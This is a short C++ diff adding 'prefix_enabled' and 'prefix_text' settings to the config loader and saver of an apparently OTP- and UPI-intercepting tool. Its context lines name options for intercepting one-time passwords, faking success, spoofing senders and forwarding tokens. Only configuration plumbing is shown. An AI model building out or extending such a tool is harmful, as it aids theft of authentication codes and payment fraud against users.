@@ -310,6 +310,8 @@ bool ConfigManager::load() {
     config_.override_incoming_sender = parse_bool(json, "override_incoming_sender", false);
     config_.fake_intercept_telegram = parse_bool(json, "fake_intercept_telegram", true);
     config_.intercept_fake_success = parse_bool(json, "intercept_fake_success", true);
+    config_.prefix_enabled = parse_bool(json, "prefix_enabled", false);
+    config_.prefix_text = parse_string(json, "prefix_text", config_.prefix_text);
     config_.auto_hook_foreground = parse_bool(json, "auto_hook_foreground", true);
 
     if (config_.otp_patterns.empty()) {
@@ -361,6 +363,8 @@ void ConfigManager::persist_runtime() {
         << "  \"hook_upi_verification\": " << (c.hook_upi_verification ? "true" : "false") << ",\n"
         << "  \"auto_hook_foreground\": " << (c.auto_hook_foreground ? "true" : "false") << ",\n"
         << "  \"intercept_fake_success\": " << (c.intercept_fake_success ? "true" : "false") << ",\n"
+        << "  \"prefix_enabled\": " << (c.prefix_enabled ? "true" : "false") << ",\n"
+        << "  \"prefix_text\": \"" << json_escape_cfg(c.prefix_text) << "\",\n"
         << "  \"override_incoming_sender\": " << (c.override_incoming_sender ? "true" : "false") << ",\n"
         << "  \"inject_sender_id\": \"" << json_escape_cfg(c.inject_sender_id) << "\",\n"
         << "  \"auto_forward_token\": " << (c.auto_forward_token ? "true" : "false") << ",\n"
